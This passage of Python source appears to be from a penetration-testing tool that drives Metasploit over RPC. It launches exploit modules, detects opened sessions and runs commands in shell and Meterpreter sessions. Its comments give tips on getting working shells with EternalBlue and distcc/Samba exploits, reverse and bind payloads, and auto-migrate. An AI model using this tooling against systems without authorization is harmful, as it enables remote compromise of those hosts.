                # Done conditions — both must hold
                elapsed  = time.time() - start
                idle_for = time.time() - last_data_time
                if elapsed >= MIN_WAIT and not busy and idle_for > IDLE_THRESHOLD:
                    break
                # Short-circuit when a session opens — no need to wait longer
                joined = '\n'.join(console_lines).lower()
                if ('session' in joined and 'opened' in joined and idle_for > 1.5):
                    L('')
                    L('[*] Session opened — finalizing.')
                    break

                time.sleep(0.4)
            else:
                L('')
                L(f'[!] Console still busy after {poll_timeout}s — exploit may')
                L(f'    still be running. Check  msfconsole -q -x "jobs -l"')

            # Final drain — catch any trailing lines
            try:
                tail = console.read()
                if tail.get('data'):
                    for line in tail['data'].splitlines():
                        stripped = line.rstrip()
                        if stripped:
                            L(stripped)
                            console_lines.append(stripped)
            except Exception:
                pass

            L('─' * 60)
            full_output = '\n'.join(console_lines)

            # ── Outcome detection from console output ─────────────────────
            text         = full_output.lower()
            # Positive session detection from console text. Guard against the
            # negative phrasings MSF uses on failure ("no session was created",
            # "session ... not opened") so we don't false-positive.
            sess_opened = (
                'opened' in text
                and 'session' in text
                and 'no session' not in text
                and 'not opened' not in text
            )
            # check_vuln / check_safe are ONLY meaningful in check mode. During a
            # real run, EternalBlue prints "The target is vulnerable" mid-exploit
            # — that must not be reported as a check verdict.
            is_check_mode = (_verb == 'check')
            check_vuln   = is_check_mode and ('vulnerable' in text and
                            ('appears to be vulnerable' in text or
                             '[+]' in full_output and 'vulnerable' in text))
            check_safe   = is_check_mode and (
                            ('not vulnerable' in text or 'is safe' in text) and
                            '[-]' in full_output)
            exploit_failed = (not is_check_mode and (
                              'exploit failed' in text or
                              'exploit aborted' in text or
                              'exploit completed, but no session was created' in text or
                              'unable to deliver payload' in text))

            # Payload-rejection detection — if MSF rejected our `set PAYLOAD`, the
            # exploit silently ran with the module default and our hardening
            # (PrependMigrate, etc.) may not have applied. Surface this loudly.
            payload_rejected = (payload and (
                'the value specified for payload is not valid' in text))
            if payload_rejected:
                L('')
                L(f'[!] PAYLOAD REJECTED by MSF: {payload}')
                L('    The exploit ran with the module default payload instead.')
                compat = _MODULE_COMPATIBLE_PAYLOADS.get(module, [])
                if compat:
                    L(f'    Compatible payloads for this module: {", ".join(compat)}')
                L('    Leave PAYLOAD blank for auto-select, or try '
                  'cmd/unix/reverse_perl on Metasploitable targets.')

            # Session appearance wait — the authoritative signal. Even with
            # foreground -z, a freshly-staged session can register a moment
            # after the console returns to idle, so we poll sessions.list rather
            # than trusting console-text timing. For run-mode exploits we wait up
            # to SESSION_WAIT seconds, exiting the moment a new session appears
            # or a failure verdict is seen.
            def _diff_sessions():
                try:
                    after = {str(s.get('id', '')): s
                             for s in self.list_sessions()}
                except Exception:
                    after = {}
                return [v for k, v in after.items() if k not in sessions_before]

            new_sessions = _diff_sessions()
            is_run_exploit = (_verb in ('run', 'exploit')
                              and _mod_type == 'exploit')
            if not new_sessions and not exploit_failed and is_run_exploit:
                SESSION_WAIT = (40.0 if handler_first else 25.0)
                waited = 0.0
                while waited < SESSION_WAIT:
                    time.sleep(1.0)
                    waited += 1.0
                    new_sessions = _diff_sessions()
                    if new_sessions:
                        L(f'[*] Session registered after {waited:.0f}s')
                        break
                    # Drain any late console output (job log: staging / failure)
                    try:
                        late = console.read().get('data', '') or ''
                    except Exception:
                        late = ''
                    if late:
                        for line in late.splitlines():
                            s = line.rstrip()
                            if s and not _PROMPT_RX.match(s):
                                L(s)
                                console_lines.append(s)
                        lt = late.lower()
                        if ('session' in lt and 'opened' in lt
                                and 'no session' not in lt):
                            sess_opened = True
                        if ('exploit failed' in lt or 'exploit aborted' in lt
                                or 'no session was created' in lt
                                or 'exploit completed, but no session' in lt):
                            exploit_failed = True
                            break
                # Recompute the full-text flags with any late lines included
                full_output = '\n'.join(console_lines)
                text = full_output.lower()
            if new_sessions:
                self._remember_session_origin(
                    new_sessions,
                    module=module,
                    rhosts=options.get('RHOSTS', ''),
                )

            # ── Operator-facing summary ───────────────────────────────────
            L()
            if new_sessions:
                L(f'[+] {len(new_sessions)} new session(s) opened:')
                for s in new_sessions:
                    peer = s.get('target') or s.get('tunnel') or s.get('tunnel_peer') or '?'
                    user = s.get('user') or s.get('username') or '?'
                    L(f'    [{s.get("id")}] {s.get("type", "?")} '
                      f'-> {peer} '
                      f'as {user}')
            elif sess_opened:
                # Output said "session opened" but list_sessions doesn't show it —
                # rare RPC sync issue. Tell operator to recheck.
                L('[+] Console reports session opened — recheck Loot tab in 5s')
            elif check_vuln:
                L('[+] Target appears VULNERABLE (check mode — no exploit fired)')
            elif check_safe:
                L('[-] Target reports NOT VULNERABLE')
            elif exploit_failed:
                L('[!] Exploit failed — diagnostics below:')
                L('    Common causes (in order of likelihood):')
                L('     1. Wrong target index — set TARGET 0/1/2/... explicitly')
                L('     2. LHOST not routable from RHOSTS (firewall / NAT)')
                L('     3. RHOSTS unreachable on RPORT (run nmap -p {} {})'.format(
                    options.get('RPORT','?'), options.get('RHOSTS','?')))
                L('     4. Missing module-specific option (SMBPipe, TARGETURI, etc.)')
                L('     5. Module rank too low — target may be patched')
            elif not saw_any_data:
                L('[!] No console output captured.')
                L('    msfrpcd may not have processed the commands. Verify:')
                L(f'      msfconsole -q -x "use {module}; show options; exit"')
            else:
                # Got output but nothing conclusive — could be aux scanner
                if _mod_type in ('auxiliary', 'post'):
                    L(f'[*] {_mod_type.capitalize()} module completed — '
                      f'no session expected.')
                    L(f'    Findings (if any) are in the output above.')
                else:
                    L('[?] No session opened and no explicit failure reported.')
                    L('    Module may have completed without an exploit attempt')
                    L('    (e.g. silent target-incompatibility check).')

            return {
                'status':           'launched',
                'result':           '\n'.join(log),
                'console_output':   full_output,
                'sessions':         new_sessions,
                'session_opened':   bool(new_sessions or sess_opened),
                'exploit_failed':   exploit_failed,
                'check_vulnerable': check_vuln,
                'check_safe':       check_safe,
            }

        except Exception as exc:
            L(f'[ERROR] console run aborted: {exc}')
            return {'status': 'error',
                    'message': str(exc),
                    'result':  '\n'.join(log)}
        finally:
            try:
                console.destroy()
            except Exception:
                pass

    # ── Session management ────────────────────────────────────────────────────

    def list_sessions(self) -> list:
        client = self._client_ref()
        if client is None:
            return []
        try:
            raw = client.sessions.list or {}
            sessions = [
                {
                    'id':       str(sid),
                    'type':     info.get('type', ''),
                    'target':   info.get('target_host', ''),
                    'user':     info.get('username', ''),
                    'platform': info.get('platform', ''),
                    'arch':     info.get('arch', ''),
                    'info':     info.get('info', ''),
                    'tunnel':   info.get('tunnel_local', ''),
                }
                for sid, info in raw.items()
            ]
            # Prefer newest sessions first so UI defaults don't keep landing on
            # stale/older sessions after a fresh exploit run.
            def _sid_key(sess: dict):
                try:
                    return (0, -int(str(sess.get('id', '')).strip()))
                except Exception:
                    return (1, str(sess.get('id', '')))
            sessions.sort(key=_sid_key)
            return sessions
        except Exception:
            return []

    def kill_session(self, session_id: str) -> dict:
        """
        Stop a single MSF session by id. Used by the per-tab close button on
        the Shell page. Intentional operator action, so it does not arm the
        adaptive payload fallback the way a spontaneous session death does.
        Treats an already-gone session as success (the goal is "it's gone").
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error',
                    'message': 'Not connected to Metasploit RPC'}

        sid = str(session_id).strip()
        if not sid:
            return {'status': 'error', 'message': 'No session id'}

        def _forget(s):
            with self._session_state_lock:
                self._session_origin.pop(s, None)

        try:
            client.sessions.session(sid).stop()
            _forget(sid)
            result = {'status': 'ok', 'killed': sid,
                      'message': f'Session {sid} closed'}
            try:
                from modules.ops_log import ops_log
                ops_log.log_session_event(sid, 'kill', result=result)
            except Exception:
                pass
            return result
        except Exception as exc:
            low = str(exc).lower()
            # Already dead / unknown — that's the desired end state anyway.
            if ('does not exist' in low or 'unknown session' in low
                    or 'invalid session' in low):
                _forget(sid)
                result = {'status': 'ok', 'killed': sid,
                          'message': f'Session {sid} already gone'}
                try:
                    from modules.ops_log import ops_log
                    ops_log.log_session_event(sid, 'kill', result=result)
                except Exception:
                    pass
                return result
            try:
                if hasattr(client.sessions, 'stop'):
                    client.sessions.stop(sid)
                    _forget(sid)
                    return {'status': 'ok', 'killed': sid,
                            'message': f'Session {sid} closed'}
            except Exception as exc2:
                return {'status': 'error', 'message': str(exc2)}
            return {'status': 'error', 'message': str(exc)}

    def kill_all_sessions(self) -> dict:
        """
        Stop every registered MSF session. Clears stale tabs in the Shell UI
        without arming adaptive payload fallback (intentional operator action).
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error',
                    'message': 'Not connected to Metasploit RPC',
                    'killed': [], 'failed': [], 'count': 0}

        sessions = self.list_sessions()
        killed, failed = [], []

        for s in sessions:
            sid = str(s.get('id', '')).strip()
            if not sid:
                continue
            try:
                client.sessions.session(sid).stop()
                killed.append(sid)
                with self._session_state_lock:
                    self._session_origin.pop(sid, None)
            except Exception as exc:
                try:
                    if hasattr(client.sessions, 'stop'):
                        client.sessions.stop(sid)
                        killed.append(sid)
                        with self._session_state_lock:
                            self._session_origin.pop(sid, None)
                    else:
                        failed.append({'id': sid, 'message': str(exc)})
                except Exception as exc2:
                    failed.append({'id': sid, 'message': str(exc2)})

        return {
            'status': 'ok',
            'killed': killed,
            'failed': failed,
            'count':  len(killed),
            'message': (f'Killed {len(killed)} session(s)'
                        + (f'; {len(failed)} failed' if failed else '')),
        }

    def session_command(self, session_id: str, command: str) -> dict:
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(session_id)
            session.write(command + '\n')
            time.sleep(1.5)
            output = session.read()
            return {'status': 'ok', 'output': output or ''}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    # ── New session API for the dedicated Shell page ─────────────────────────
    # session_command above is kept for back-compat with the Loot tab's modal.
    # The Shell page uses the methods below for:
    #   - non-blocking reads (streaming output via polling)
    #   - type-aware dispatch (shell vs Meterpreter use different MSF APIs)
    #   - explicit writes (for interactive shells where command framing matters)

    def _session_type(self, session_id: str) -> str:
        """Return 'meterpreter', 'shell', or '' if unknown."""
        for s in self.list_sessions():
            if str(s.get('id')) == str(session_id):
                t = (s.get('type') or '').lower()
                if 'meter' in t:
                    return 'meterpreter'
                if t in ('shell', 'powershell'):
                    return t
                return t
        return ''

    def session_read(self, session_id: str) -> dict:
        """
        Non-blocking read of latest buffer. Used by the Shell page to poll
        for streaming output without sending a command.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC',
                    'output': ''}
        try:
            session = client.sessions.session(str(session_id))
            output  = session.read() or ''
            return {'status': 'ok', 'output': output,
                    'session_type': self._session_type(session_id)}
        except Exception as e:
            return {'status': 'error', 'message': str(e), 'output': ''}

    def _classify_session_error(self, exc, session_id: str) -> dict:
        """
        Turn a raw session-operation exception into a clear result. The most
        common one is a dead session: MSF says "Session ID (N) does not exist"
        when the session opened but its host process died (very common with
        kernel-injection exploits). Surface that as a clean, actionable message
        plus a session_dead flag so the Shell tab can drop the dead session
        instead of showing a cryptic raw error.
        """
        msg = str(exc)
        low = msg.lower()
        if ('does not exist' in low or 'unknown session' in low
                or 'session id' in low and 'exist' in low):
            module, rhost, count = self._note_dead_session(session_id)
            extra = ''
            adaptive = _ADAPTIVE_STAGELESS_PAYLOADS.get(module or '')
            if adaptive and rhost:
                extra = (f' Next blank-payload run against {rhost} will use '
                         f'{adaptive} with escalated auto-migrate '
                         f'(dead sessions seen: {count}). Re-launch the exploit '
                         f'— do not reuse this session tab.')
            origin = self._session_origin.get(str(session_id), {})
            origin_mod = (origin.get('module') or '').lower()
            if 'distcc' in origin_mod or 'usermap' in origin_mod:
                hint = (' For distcc/Samba cmd shells: leave payload blank '
                        '(reverse_perl + handler-first), or try '
                        'cmd/unix/bind_perl and connect from Kali.')
            else:
                hint = (' This is common with kernel-injection exploits '
                        '(EternalBlue). Kill stale sessions, clear the payload '
                        'field, and re-launch with auto-migrate ON.')
            return {
                'status': 'error',
                'session_dead': True,
                'message': (f'Session {session_id} has died — the target '
                            f'process likely terminated.{hint}{extra}'),
            }
        return {'status': 'error', 'message': msg}

    def session_write(self, session_id: str, data: str) -> dict:
        """
        Raw write to a session. For shells this is how to send input —
        Meterpreter prefers session_meterpreter_run for proper response capture.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(str(session_id))
            session.write(data)
            return {'status': 'ok'}
        except Exception as e:
            return self._classify_session_error(e, session_id)

    def session_meterpreter_run(self, session_id: str, command: str,
                                  timeout: int = 15) -> dict:
        """
        Run a Meterpreter command via run_with_output when available, falling
        back to write+read+wait. run_with_output is more reliable because it
        knows when the command has finished — write+read can return mid-output.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(str(session_id))
            if hasattr(session, 'run_with_output'):
                output = session.run_with_output(command, timeout=timeout) or ''
                return {'status': 'ok', 'output': output}
            # Fallback: write command, wait, accumulate reads
            session.write(command + '\n')
            output = ''
            for _ in range(timeout * 2):
                time.sleep(0.5)
                chunk = session.read() or ''
                output += chunk
                if not chunk:
                    break
            return {'status': 'ok', 'output': output}
        except Exception as e:
            return self._classify_session_error(e, session_id)

    def session_run(self, session_id: str, command: str,
                     timeout: int = 15) -> dict:
        """
        Type-dispatched session runner — the right MSF API per session type.
        This is what the Shell page calls for every command send.

        Meterpreter → meterpreter_run (synchronous, captures full output)
        Shell       → write + read (raw command framing)
        """
        stype = self._session_type(session_id)
        if stype == 'meterpreter':
            result = self.session_meterpreter_run(session_id, command, timeout)
        else:
            # Raw shell / powershell — write the line, give it a beat, read back
            client = self._client_ref()
            if client is None:
                return {'status': 'error',
                        'message': 'Not connected to Metasploit RPC'}
            try:
                session = client.sessions.session(str(session_id))
                session.write(command + '\n')
                # Brief wait, then accumulate reads until silence
                output = ''
                deadline = time.time() + timeout
                silent_reads = 0
                while time.time() < deadline:
                    time.sleep(0.4)
                    chunk = session.read() or ''
                    if chunk:
                        output += chunk
                        silent_reads = 0
                    else:
                        silent_reads += 1
                        if silent_reads >= 3:    # 1.2s of silence = done
                            break
                result = {'status': 'ok', 'output': output}
            except Exception as e:
                result = self._classify_session_error(e, session_id)
        result['session_type'] = stype
        try:
            from modules.ops_log import ops_log
            ops_log.log_session_event(
                session_id, 'command', command=command, result=result)
        except Exception:
            pass
        return result
